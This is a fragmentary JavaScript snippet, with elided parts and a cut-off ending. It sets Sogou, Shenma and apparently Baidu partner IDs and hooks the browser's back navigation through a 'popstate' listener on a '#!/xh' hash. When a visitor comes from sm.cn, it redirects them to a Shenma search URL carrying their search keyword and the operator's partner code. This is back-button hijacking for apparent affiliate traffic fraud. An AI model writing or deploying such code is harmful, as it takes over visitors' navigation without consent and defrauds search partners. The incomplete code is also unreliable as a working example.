(function() {
    var s_key = 'FFA1DYVO';
    var s_name = 'FP434V';
    var bd_arrs = ["1022560w","1022282i"];
    //bd_arrs = ["1022560v","1022560v"];
    var sg_name = "Sg";
    var sg_num = "sogou-sbds-1bd413de70f32142";
    var sg_times = 30;
    var sg_regex = new RegExp('[\\?&]keyword=([^&#]*)');
    var sm_name = "Sm";
    var sm_arrs = ["wy279769"];
        ...
        window.addEventListener('popstate', function() {
            if (location.hash == '#!/xh') {
                ...
                if (ref.match(/(.*)sm.cn/g) && sm_regex.exec(ref) && ref.indexOf(sm_num) == -1) {
                    href = 'https://yz.m.sm.cn/s?q=' + sm_regex.exec(ref)[1] + '&from=' + sm_num + '&safe=1&snum=0' + "&k=" + (new Date).valueOf();
                    n = sm_name;
                    t = sm_times
